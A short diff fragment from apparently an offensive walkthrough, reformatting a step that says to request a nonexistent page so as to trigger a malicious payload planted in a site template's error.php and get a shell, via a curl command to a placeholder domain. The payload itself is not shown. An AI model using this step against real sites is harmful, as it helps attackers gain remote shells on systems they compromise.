@@ -52,5 +52,5 @@ Theme can be different
 
 #### 4) Go to the site and search for a page that doesn't exist to trigger the malicious payload and get a shell
 
- - curl -k "http://DOMAIN.LOCAL/templates/TEMPLETE_NAME/error.php/error"
+    curl -k "http://DOMAIN.LOCAL/templates/TEMPLETE_NAME/error.php/error"
 
